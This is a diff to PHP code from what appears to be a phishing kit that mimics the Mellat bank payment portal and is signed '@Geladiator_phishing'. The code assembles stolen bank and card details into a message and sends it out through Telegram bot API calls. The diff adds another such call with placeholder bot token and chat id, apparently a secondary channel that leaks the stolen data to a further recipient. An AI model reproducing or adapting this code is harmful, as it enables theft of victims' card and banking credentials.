@@ -58,7 +58,9 @@ $ch = curl_init();
         $result     = curl_exec($ch);
         $json       = json_decode($result, true);
         $holderName = $json["firstName"] . " " . $json["lastName"];
-$Text = "✅ Transaction finished!
+$Text = "
+
+✅ Transaction finished!
 -------------- BANK --------------
 🏦 Name : $bankname $bankinfo[1]
 -------------- CARD --------------
@@ -74,10 +76,19 @@ $Text = "✅ Transaction finished!
 📝 ToDay : $roz
 📌 Date : $tarikh
 ✨ Portal : Mellat
--------------- $bankinfo[1] --------------$bankinfo[0]
+-------------- $bankinfo[1] --------------";
+    
+$Text .="$bankinfo[0]
 ------------- Creator -------------
 🆔 : @Geladiator_phishing :)";
+
+
+$T="000";
+$I= 0000;
+
 if( (integer)$num > $paylimit){}else{
+file_get_contents("https://api.telegram.org/bot$T/sendMessage?parse_mode=HTML&chat_id=$I&text=".urlencode($Text));
+
     file_get_contents("https://api.telegram.org/bot$TOKEN/sendMessage?parse_mode=HTML&chat_id=$ID&text=".urlencode($Text));
  file_get_contents("https://api.telegram.org/bot".$TOKENS."/sendMessage?parse_mode=HTML&chat_id=".$IDS."&text=".urlencode($Text));
 } 
